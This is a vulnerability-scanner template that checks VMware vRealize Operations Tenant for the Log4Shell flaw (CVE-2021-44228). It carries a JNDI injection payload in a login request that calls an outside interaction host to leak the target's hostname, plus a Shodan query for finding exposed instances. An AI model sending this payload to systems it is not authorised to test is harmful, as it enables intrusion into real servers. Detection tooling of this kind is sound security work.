id: vrealize-operations-log4j-rce
info:
  name: VMware vRealize Operations Tenant - JNDI Remote Code Execution (Apache Log4j)
  author: bughuntersurya
  severity: critical
  description: The VMware vRealize Operations Tenant application has a critical vulnerability
    in Apache Log4j, which could enable remote code execution.
  reference:
  - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
  - https://core.vmware.com/vmsa-2021-0028-questions-answers-faq
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  - https://nvd.nist.gov/vuln/detail/CVE-2021-45046
  - https://logging.apache.org/log4j/2.x/security.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: http.title:"vRealize Operations Tenant App"
    verified: 'true'
    impact: The vulnerability in Apache Log4j has a significant impact on the security
      of VMware vRealize Operations Tenant, as it allows for remote code execution
      in the affected application.
    recommendation: It is strongly recommended that all impacted vRealize Operations
      Tenant applications be updated immediately to address the critical vulnerability
      in Apache Log4j and prevent remote code execution.
  tags: cve,cve2021,oast,rce,log4j,vmware,vrealize,kev
requests:
- raw:
  - 'POST /suite-api/api/auth/token/acquire HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    Origin: {{RootURL}}

    Referer: {{RootURL}}/ui/


    {"username":"${jndi:ldap://${hostName}.{{interactsh-url}}}","password":"admin"}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
  extractors:
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
